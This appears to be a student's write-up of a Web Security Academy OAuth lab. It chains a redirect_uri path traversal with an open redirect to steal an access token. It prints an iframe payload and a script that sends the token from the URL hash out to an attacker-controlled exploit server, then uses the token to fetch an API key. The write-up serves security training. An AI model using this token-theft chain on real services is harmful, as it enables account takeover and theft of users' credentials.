analysis:
    try to add external domain => fail
    => this means we can use redirect_uri like lab3
    so try new solution
    => try add folder directory traversal => they accept => can exploit to this



notice that : when you get auth-callback
they dont send back code or access token

after that they call get /me and rec userinfo

notice if we see in my-account: the api-ket was hidden
=> get through /me

solution:


we try a way to add redirect_uri to our domain expoit site
    we try to find open redirect
    after try exploit on comment, we find that can attack through "next post" func => modify path to our exploit site

our payload:

<iframe src="https://oauth-0a4000da048670b8c06e52e902570012.oauth-server.net/auth?client_id=v2l6r5muiwih5olu9d8f7&redirect_uri=https://0a0c009d046070f7c0635510008300b5.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a27006304897093c0ee536601740048.exploit-server.net/exploit&response_type=token&nonce=1268738546&scope=openid%20profile%20email"></iframe>



first time: they go to exploit server but can have anything in access log
so we see that the access token in save in url location hash
so we try request exploit server second time with document.location.hash.substr() to get access token be seen on access log after ? parametor
<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-0a4000da048670b8c06e52e902570012.oauth-server.net/auth?client_id=v2l6r5muiwih5olu9d8f7&redirect_uri=https://0a0c009d046070f7c0635510008300b5.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a27006304897093c0ee536601740048.exploit-server.net/exploit&response_type=token&nonce=1268738546&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>


ater that we go to get /me and change access token on Authorization header.
and take api key => success
